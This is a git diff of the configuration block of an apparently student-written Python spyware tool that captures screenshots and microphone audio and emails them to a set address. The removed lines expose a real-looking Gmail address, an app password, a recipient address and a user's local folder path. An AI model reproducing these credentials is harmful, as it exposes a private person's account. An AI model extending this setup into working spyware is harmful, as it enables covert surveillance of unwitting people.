@@ -17,14 +17,14 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 # Configuration
-email_address = "aryanmayoor@gmail.com"
-password = "nczc nxlm djdu yexe"
-toaddr = "aryan25ic011@satiengg.in"
+email_address = ""
+password = ""
+toaddr = ""
 microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 key = ""  # Generating an encryption key from the Cryptography folder viz. KeyGenerator.py
-file_path = "C:\\Users\\aryan\\OneDrive\\Desktop\\Spyware"
+file_path = ""
 extend = "\\"
 file_merge = file_path + extend
 
